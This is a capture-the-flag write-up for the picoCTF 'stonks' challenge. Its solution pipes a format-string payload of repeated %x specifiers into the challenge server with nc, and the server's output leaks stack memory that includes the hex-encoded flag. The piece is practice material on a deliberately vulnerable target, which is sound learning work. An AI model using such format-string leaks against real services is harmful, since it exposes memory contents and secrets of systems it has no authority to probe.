## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`

## Solución
```bash
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/stonks]
└─$ (echo "1"; echo "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x") | nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
810b3d0804b00080489c3f7f0bd80ffffffff18109160f7f19110f7f0bdc70810a1802810b3b0810b3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ff8a007df7f46af8f7f19440ceba0010f7da8ce9f7f1a0c0f7f0b5c0f7f0b000ff8a5da8f7d9968df7f0b5c08048ecaff8a5db40f7f2df09804b000f7f0b000f7f0be20ff8a5de8f7f33d50f7f0c890ceba00f7f0b000804b000ff8a5de88048c868109160ff8a5dd4ff8a5de88048be9f7f0b3fc0ff8a5e9cff8a5e94118109160ceba00ff8a5e0000f7d4efa1f7f0b000f7f0b0000f7d4efa11ff8a5e94ff8a5e9cff8a5e2410f7f0b000f7f2e70af7f460000f7f0b00000
Portfolio as of Mon Nov 11 17:04:09 UTC 2024


2 shares of HWAY
2 shares of NZFX
1 shares of VNWW
42 shares of TL
11 shares of PNI
23 shares of SU
1568 shares of HQDP
Goodbye!
```
![[Pasted image 20241111110610.png]]

